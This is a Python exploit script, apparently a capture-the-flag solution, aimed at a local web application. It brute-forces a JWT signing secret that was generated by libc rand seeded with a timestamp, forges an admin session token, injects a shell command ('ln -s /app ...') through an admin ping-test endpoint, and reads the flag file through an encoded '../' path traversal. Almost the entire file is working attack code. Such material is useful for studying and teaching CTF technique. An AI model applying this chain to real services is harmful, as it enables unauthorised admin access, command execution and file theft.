from io import BytesIO
import time
import ctypes
import jwt   
import requests

try:
    libc = ctypes.CDLL("libc.so.6")
except OSError:
    try:
        libc = ctypes.CDLL("libc.dylib")
    except OSError:
        print("오류: 시스템에서 C 표준 라이브러리를 찾을 수 없습니다.")
        exit()

def request(url,data={},cookie={}, jsond="",method="get"):
    if method=='post':
        r = requests.post(url,data=data,cookies=cookie)
    elif method=='json':
        r = requests.post(url,json=jsond,cookies=cookie)
    else:
        r = requests.get(url,cookies=cookie)
    return r

def generate_secret_from_seed(seed):
    libc.srand(seed)
    hex_string = []
    for _ in range(32):
        random_byte = libc.rand() % 256
        hex_string.append(f"{random_byte:02x}")
    return "".join(hex_string)

def find_secret_from_jwt(myjwt):
    sec = int(time.time())
    print("[-] Brute forcing secret...")

    while True:
        key = generate_secret_from_seed(sec)
        
        try:
            payload = jwt.decode(myjwt, key, algorithms=['HS256'])
            uuid = payload['uuid']
            print(f"[+] Found secret: {key} (timestamp: {sec})")
            return make_admin_jwt(key), uuid
            
        except jwt.InvalidSignatureError:
            pass
        except Exception:
            pass
            
        sec -= 1
        
        if sec % 1000 == 0:
            print(f"[-] Checking timestamp: {sec}", end='\r')

def make_admin_jwt(key):
    admin_token = jwt.encode(
            payload={
                "sub": "userid", #id
                "role": "ROLE_ADMIN",
            },
            key=key,
            algorithm='HS256'
        )
    return {"session":admin_token}

def command_injection(token,uuid):
    jsond = {"cmd":"ln -s /app /data/users/"+uuid+"/ping"}
    r = request('http://localhost:9000/admin/pingTest',"",token,jsond,"json")
    print(r.text)
    return

def readflag(url,new_cookie):
    flag = request(url,{},new_cookie)
    return flag

def login(url,data):
    r = request(url, data=data,method="post")
    print(r)
    return r.cookies['session']

def register(url,data):
    regData = data
    regData['name'] = 'ab'
    regData['email'] = 'ab@ab.com'
    r = request(url, regData, method="post")
    print(r.text)
    return 

def writeAction(url, cookie, filename, content):
    files = {
        "file": ("empty.txt", BytesIO(b"dummy"), "text/plain")
    }
    data = {
        "title": "hello",
        "content": content,
        "file_name": filename
    }
    requests.post(
        url,
        data=data,
        cookies={"session": cookie},
        files=files
    )
    return

if __name__ == "__main__":
    data = {"userId": 'id',"password": "pw"}
    
    #setting
    register("http://localhost:9000/auth/register", data)
    jwtToken = login("http://localhost:9000/auth/login",data)
    writeAction("http://localhost:9000/board/writeAction", jwtToken, "hello", "This is exploit file.")

    #attack jwt, get admin cookie
    admin_cookie, uuid = find_secret_from_jwt(jwtToken)

    #command injection
    command_injection(admin_cookie,uuid)

    #get flag
    flag = readflag(f"http://localhost:9000/resources/users/{uuid}/ping/%2e%2e/flag",admin_cookie)
    print("FLAG: ",flag.text)